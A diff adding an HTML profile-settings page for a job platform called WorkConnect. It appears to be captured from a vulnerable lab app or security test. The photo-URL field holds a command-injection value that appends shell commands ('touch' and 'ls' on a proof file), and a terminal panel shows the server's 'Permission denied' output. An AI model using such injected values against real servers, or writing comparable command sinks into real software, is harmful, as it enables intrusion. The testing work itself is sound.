@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WorkConnect</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-brand"><a href="/">WorkConnect</a></div>
+        <div class="nav-links">
+            <a href="/login" class="nav-btn btn-ghost">Iniciar Sesión</a>
+            <a href="/register" class="nav-btn btn-primary">Regístrate</a>
+        </div>
+    </nav>
+    <main>
+        
+<style>
+    /* Fix for the main container cutting off tall content when centered */
+    main {
+        align-items: flex-start !important;
+        padding-top: 3rem !important;
+        padding-bottom: 3rem !important;
+    }
+
+    .dashboard-wrapper {
+        width: 100%;
+        max-width: 1100px;
+        margin: 0 auto;
+        background: var(--card-bg);
+        border: 1px solid var(--border);
+        border-radius: 1rem;
+        backdrop-filter: blur(12px);
+        /* overflow: hidden; Removed to prevent cutting off focus rings or dropdowns */
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+    }
+
+    .dashboard-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1.5rem 2.5rem;
+        border-bottom: 1px solid var(--border);
+        background: rgba(15, 23, 42, 0.4);
+    }
+
+    .dashboard-header h1 {
+        font-size: 1.5rem;
+        margin: 0;
+    }
+
+    .dashboard-body {
+        display: grid;
+        grid-template-columns: 250px minmax(0, 1fr);
+        min-height: 500px;
+    }
+
+    @media (max-width: 768px) {
+        .dashboard-body {
+            grid-template-columns: 1fr;
+        }
+    }
+
+    .sidebar {
+        padding: 2rem;
+        border-right: 1px solid var(--border);
+        background: rgba(15, 23, 42, 0.2);
+    }
+
+    .sidebar-link {
+        display: block;
+        padding: 0.75rem 1rem;
+        color: var(--text-muted);
+        text-decoration: none;
+        border-radius: 0.5rem;
+        margin-bottom: 0.5rem;
+        font-weight: 500;
+        transition: all 0.3s ease;
+        border-left: 3px solid transparent;
+        box-sizing: border-box;
+    }
+
+    .sidebar-link:hover, .sidebar-link.active {
+        background: rgba(59, 130, 246, 0.1);
+        color: var(--text-main);
+        border-left-color: var(--primary);
+    }
+
+    .content-area {
+        padding: 2rem;
+        min-width: 0; /* Prevents flex/grid blowout */
+        width: 100%;
+        box-sizing: border-box;
+    }
+
+    .settings-panel {
+        background: rgba(15, 23, 42, 0.6);
+        border: 1px solid var(--border);
+        border-radius: 0.75rem;
+        padding: 2rem;
+        width: 100%;
+        box-sizing: border-box;
+        overflow: hidden;
+    }
+
+    .settings-panel h2 {
+        margin-bottom: 1.5rem;
+        font-size: 1.25rem;
+        border-bottom: 1px solid var(--border);
+        padding-bottom: 1rem;
+    }
+
+    .form-row {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 1.5rem;
+        margin-bottom: 1.5rem;
+        width: 100%;
+    }
+
+    @media (max-width: 600px) {
+        .form-row {
+            grid-template-columns: 1fr;
+        }
+    }
+
+    .form-group-custom label {
+        display: block;
+        font-size: 0.85rem;
+        font-weight: 600;
+        color: var(--text-muted);
+        margin-bottom: 0.5rem;
+    }
+
+    .form-group-custom input {
+        width: 100%;
+        padding: 0.75rem 1rem;
+        border-radius: 0.5rem;
+        border: 1px solid var(--border);
+        background: rgba(15, 23, 42, 0.8);
+        color: white;
+        transition: border-color 0.3s;
+        font-family: inherit;
+        box-sizing: border-box;
+    }
+
+    .form-group-custom input:focus {
+        border-color: var(--primary);
+        outline: none;
+    }
+
+    .profile-photo-section {
+        display: flex;
+        align-items: flex-start;
+        gap: 1.5rem;
+        margin-top: 2rem;
+        padding-top: 2rem;
+        border-top: 1px solid var(--border);
+    }
+
+    .photo-avatar {
+        width: 80px;
+        height: 80px;
+        border-radius: 50%;
+        background: #1e293b;
+        border: 2px dashed #475569;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 2rem;
+        flex-shrink: 0;
+    }
+
+    .photo-input-area {
+        flex: 1;
+    }
+
+    .cmd-terminal {
+        background: #0f172a;
+        border: 1px solid #1e293b;
+        border-radius: 0.5rem;
+        margin-top: 2rem;
+        overflow: hidden;
+        box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
+    }
+
+    .cmd-header {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        padding: 0.75rem 1rem;
+        background: #1e293b;
+        border-bottom: 1px solid #334155;
+    }
+
+    .cmd-dot {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+    }
+
+    .cmd-body {
+        padding: 1rem;
+        overflow-x: auto;
+    }
+
+    .cmd-body pre {
+        color: #4ade80;
+        font-family: 'Courier New', Courier, monospace;
+        font-size: 0.9rem;
+        margin: 0;
+        white-space: pre-wrap;
+    }
+</style>
+
+<div class="dashboard-wrapper">
+    <div class="dashboard-header">
+        <h1>Panel de Control</h1>
+        <a href="/login" class="btn-ghost nav-btn" style="border: 1px solid var(--border);">Cerrar Sesión</a>
+    </div>
+
+    <div class="dashboard-body">
+        <div class="sidebar">
+            <a href="#" class="sidebar-link active">👤 Mi Perfil</a>
+            <a href="#" class="sidebar-link">💼 Mis Ofertas</a>
+            <a href="#" class="sidebar-link">🔒 Seguridad</a>
+            <a href="#" class="sidebar-link">⚙️ Preferencias</a>
+        </div>
+
+        <div class="content-area">
+            <div class="settings-panel">
+                <h2>Configuración del Perfil</h2>
+                
+                <form action="/dashboard/update-profile" method="POST">
+                    <div class="form-row">
+                        <div class="form-group-custom">
+                            <label>Nombre Completo</label>
+                            <input type="text" name="full_name" placeholder="Tu nombre" value="Target User">
+                        </div>
+                        <div class="form-group-custom">
+                            <label>Correo Electrónico</label>
+                            <input type="email" name="email" placeholder="tu@email.com" value="target@workconnect.com">
+                        </div>
+                    </div>
+
+                    <div class="form-group-custom">
+                        <label>Título Profesional</label>
+                        <input type="text" name="bio" placeholder="Ej: Desarrollador Backend Senior...">
+                    </div>
+
+                    <div class="profile-photo-section">
+                        <div class="photo-avatar">👤</div>
+                        <div class="photo-input-area">
+                            <div class="form-group-custom">
+                                <label>Foto de Perfil (Importar desde URL externa)</label>
+                                <input type="text" name="photo_url" placeholder="http://tuservidor.com/foto.jpg" value="http://127.0.0.1:9/;touch /opt/backups/DL242-CONTROL-SHOULD-FAIL.proof;ls -l /opt/backups/DL242-CONTROL-SHOULD-FAIL.proof;#">
+                            </div>
+                            <p style="font-size: 0.75rem; color: #64748b; margin-top: 0.5rem; margin-bottom: 0;">Soportado: JPG, PNG. El servidor descargará la imagen por ti.</p>
+                        </div>
+                    </div>
+
+                    <div style="display: flex; justify-content: flex-end; margin-top: 2rem;">
+                        <button type="submit" class="btn-primary" style="padding: 0.75rem 2rem; border: none; border-radius: 0.5rem; cursor: pointer; font-weight: 600; font-size: 1rem;">Guardar Cambios</button>
+                    </div>
+                </form>
+            </div>
+
+            
+            <div class="cmd-terminal">
+                <div class="cmd-header">
+                    <div class="cmd-dot" style="background: #ef4444;"></div>
+                    <div class="cmd-dot" style="background: #eab308;"></div>
+                    <div class="cmd-dot" style="background: #22c55e;"></div>
+                    <span style="color: #94a3b8; font-size: 0.85rem; margin-left: 0.5rem; font-family: monospace;">terminal - proceso de importación</span>
+                </div>
+                <div class="cmd-body">
+                    <pre>touch: cannot touch &#39;/opt/backups/DL242-CONTROL-SHOULD-FAIL.proof&#39;: Permission denied
+ls: cannot access &#39;/opt/backups/DL242-CONTROL-SHOULD-FAIL.proof&#39;: Permission denied
+</pre>
+                </div>
+            </div>
+            
+
+        </div>
+    </div>
+</div>
+
+    </main>
+</body>
+</html>
